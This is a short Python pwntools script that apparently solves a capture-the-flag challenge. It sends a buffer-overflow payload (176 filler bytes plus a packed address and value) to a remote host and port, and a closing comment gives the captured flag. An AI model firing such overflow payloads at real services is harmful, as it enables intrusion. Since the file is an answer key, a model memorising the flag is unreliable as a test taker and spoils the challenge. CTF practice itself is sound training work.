from pwn import *

context(log_level='debug')
#context.log_level = 'debug'
p = remote("111.230.149.72", 10003)
payload = "A"*176 + p32(0x804a060) + p32(0x64)
p.sendline(payload)
data = p.recvall()
print data

# hgame{y0u_c4n_4lso_s3nd_unprint4ble_ch4r}
